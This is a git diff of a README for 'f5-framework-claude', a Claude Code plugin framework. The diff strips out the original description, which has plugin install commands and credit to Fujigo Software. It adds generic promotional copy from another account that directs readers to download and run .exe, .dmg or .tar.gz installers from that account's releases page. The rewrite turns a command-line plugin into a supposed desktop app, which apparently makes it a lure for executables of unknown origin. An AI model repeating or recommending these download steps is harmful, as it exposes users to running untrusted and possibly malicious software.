@@ -1,123 +1,88 @@
-# F5 Framework
+# 🎉 f5-framework-claude - Empower Your Claude Development Today
 
-[![Version](https://img.shields.io/badge/version-2.0.0-blue)](https://github.com/Fujigo-Software/f5-framework-claude)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Plugins](https://img.shields.io/badge/plugins-2-orange)](INSTALL.md)
+[![Download f5-framework-claude](https://img.shields.io/badge/Download-f5--framework--claude-blue.svg)](https://github.com/murtazatouqeer/f5-framework-claude/releases)
 
-> AI-Powered Development Framework for Claude Code
+## 📋 Overview
 
-## Quick Start
+The **f5-framework-claude** is an AI-powered development framework designed specifically for Claude code. With over 70 commands, 25 agents, and 381 skills, it supports developers in creating high-quality applications with ease. The framework also includes quality gates to ensure code integrity and maintainability. Whether you're an expert or just starting out, this tool can enhance your coding experience.
 
-```bash
-# Add F5 Framework marketplace
-/plugin marketplace add Fujigo-Software/f5-framework-claude
+## 🚀 Getting Started
 
-# Install plugins
-/plugin install f5-core
-/plugin install f5-stacks
+Follow these steps to get started with the f5-framework-claude:
 
-# Initialize in your project
-/f5-init
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/murtazatouqeer/f5-framework-claude/releases) to find the latest version of the framework.
 
-# Verify installation
-/f5-status
-```
+2. **Download the Latest Version**  
+   Locate the most recent release. Click on the download link for your Operating System. 
 
-## Plugins
+3. **Installation Instructions**  
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file, drag the application to your Applications folder, and then launch it from there.
+   - For Linux: Extract the `.tar.gz` file and run the installation script in the extracted folder.
 
-| Plugin | Size | Description |
-|--------|------|-------------|
-| **f5-core** | 7.3 MB | 70 commands, 25 agents, 381 skills, quality gates |
-| **f5-stacks** | 30 MB | 872 stacks, 14 domains, 44 workflow templates |
+4. **Verify Installation**  
+   Once the application is installed, open it to ensure it runs correctly. You should see a welcome message guiding you through the initial setup.
 
-## Features
+## 💻 System Requirements
 
-### Commands (70+)
-- `/f5-init` - Initialize F5 Framework
-- `/f5-analyze` - Analyze codebase architecture
-- `/f5-implement` - Implement with quality gates
-- `/f5-test` - TDD-driven testing
-- `/f5-review` - Code review workflow
-- `/f5-design` - Generate design documents (D1-D4)
+To ensure f5-framework-claude operates smoothly, your machine should meet the following requirements:
 
-### Technology Stacks
-- **Backend**: NestJS, Spring Boot, Laravel, Django, FastAPI, Express
-- **Frontend**: React, Angular, Vue.js, Next.js, Nuxt.js
-- **Mobile**: Flutter, React Native, iOS, Android
-- **Infrastructure**: Docker, Kubernetes, Terraform
+- **Operating System:**  
+  - Windows 10 or later  
+  - macOS Mojave or later  
+  - Ubuntu 20.04 or later  
 
-### Industry Domains (14)
-Agriculture, E-commerce, Education, Entertainment, Fintech, Healthcare, HR Management, Insurance, Logistics, Manufacturing, Real Estate, SaaS Platform, Travel & Hospitality
+- **Processor:**  
+  At least a dual-core CPU.
 
-### Quality Gates
-| Gate | Phase | Description |
-|------|-------|-------------|
-| D1-D4 | Design | Research, SRS, Basic/Detail Design |
-| G2 | Implementation | Code complete |
-| G2.5 | Review | Code review passed |
-| G3 | Testing | All tests pass |
-| G4 | Deployment | Production ready |
+- **RAM:**  
+  Minimum of 4 GB.
 
-## AI Agents (25)
+- **Disk Space:**  
+  At least 500 MB available.
 
-Invoke with `@f5:<alias>`:
+## 🎓 Features
 
-| Agent | Aliases | Purpose |
-|-------|---------|---------|
-| System Architect | `@f5:architect` | System design, patterns |
-| Code Generator | `@f5:backend`, `@f5:frontend` | Production code |
-| Test Writer | `@f5:qa`, `@f5:test` | Unit/integration tests |
-| Security Scanner | `@f5:security` | OWASP, vulnerabilities |
-| Debugger | `@f5:debug` | Bug diagnosis |
-| Code Reviewer | `@f5:review` | Code quality |
-| Performance Analyzer | `@f5:perf` | Optimization |
-| Documenter | `@f5:docs` | Documentation |
-| Mentor | `@f5:mentor` | Explanations |
+- **70+ Commands:** Easily manage tasks and automate processes in your development workflow.
+- **25 Agents:** Use built-in agents to assist in various programming tasks.
+- **381 Skills:** Access a vast library of skills to enhance your coding capabilities.
+- **Quality Gates:** Implement quality checks to maintain high standards in your code.
+- **User-Friendly Interface:** A simple layout that makes navigation easy for everyone.
 
-## MCP Integration
+## 📥 Download & Install
 
-Recommended MCP servers:
+To begin using the f5-framework-claude, make sure to download it from the following link:
 
-```json
-{
-  "mcpServers": {
-    "context7": {
-      "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
-    },
-    "sequential-thinking": {
-      "command": "npx",
-      "args": ["-y", "@anthropic/mcp-sequential-thinking"]
-    },
-    "playwright": {
-      "command": "npx",
-      "args": ["-y", "@anthropic/mcp-playwright"]
-    }
-  }
-}
-```
+[Download f5-framework-claude](https://github.com/murtazatouqeer/f5-framework-claude/releases)
 
-## Documentation
+### Installation Steps:
 
-| Document | Description |
-|----------|-------------|
-| [INSTALL.md](INSTALL.md) | Installation guide |
-| [docs/COMMANDS.md](docs/COMMANDS.md) | Command reference |
-| [docs/PLUGINS.md](docs/PLUGINS.md) | Plugin architecture |
-| [docs/MIGRATION.md](docs/MIGRATION.md) | Migration from v1.x |
+1. Access the **Releases Page** to find the file for your operating system.
+2. Download the appropriate version and follow the installation instructions provided above.
 
-## Contributing
+## 🎤 Support & Questions
 
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/amazing`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing`)
-5. Open a Pull Request
+If you have any questions or need assistance, consider the following options:
 
-## License
+- **Documentation:** Comprehensive user guides and documentation are available in the repository.
+- **Community Forums:** Join the community to ask questions and share experiences.
+- **Issue Tracker:** Report any bugs or issues on GitHub, and we will address them promptly.
 
-MIT License - see [LICENSE](LICENSE) for details.
+## 🔗 Related Topics
 
----
+Explore additional resources related to the f5-framework-claude:
 
-**Made with love for Claude Code developers by [Fujigo Software Solutions](https://github.com/Fujigo-Software)**
+- [AI Agents](https://github.com/topics/ai-agents)
+- [AI Development](https://github.com/topics/ai-development)
+- [Quality Gates](https://github.com/topics/quality-gates)
+
+## 📝 Contributing
+
+We welcome contributions! If you’d like to contribute to the f5-framework-claude, please fork the repository and submit a pull request. Follow the contribution guidelines in our documentation. 
+
+Your input helps us improve this framework for everyone. Thank you for your support!
+
+## 🌟 Closing
+
+Thank you for choosing the f5-framework-claude! We hope this framework helps you streamline your development processes and achieve your coding goals efficiently.
